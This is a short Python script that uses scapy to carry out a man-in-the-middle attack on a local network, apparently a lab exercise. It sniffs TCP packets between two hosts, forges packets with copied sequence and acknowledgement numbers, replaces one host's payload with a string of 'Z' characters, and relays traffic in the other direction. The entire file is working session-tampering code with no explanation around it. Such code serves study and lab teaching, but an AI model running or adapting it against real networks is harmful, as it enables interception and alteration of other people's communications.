from scapy.all import *
a = "08:00:27:8a:a1:b6"
m = "08:00:27:28:52:fc"
b = "08:00:27:6a:a9:24"
def spoof(pkt):
	if pkt[Ether].src == a:
		ether = Ether()
		ether.src = m
		ether.dst = b
		ip = IP()
		ip.dst = "10.0.2.7"
		ip.src = "10.0.2.6"
		ip.chksum = None
		tcp = TCP()
		tcp.sport = pkt[TCP].sport
		tcp.dport = pkt[TCP].dport
		tcp.seq = pkt[TCP].seq
		tcp.ack = pkt[TCP].ack
		tcp.flags = "PA"
		tcp.chksum = None
		orig_len = pkt[Raw].load.decode('utf-8').rstrip('\r\n')
		inject = "Z" * len(orig_len) + '\r\n'
		data = bytes(inject,encoding='utf-8')
		newpkt = ether/ip/tcp/data
		newpkt.show2()
		print("Sending packet Z...")
		print("Original packet data:",pkt[Raw].load)
		sendp(newpkt)
	elif pkt[Ether].src == b:
		pkt[Ether].src = m
		pkt[Ether].dst = a
		sendp(pkt)
pkt = sniff(filter="tcp",prn=spoof)

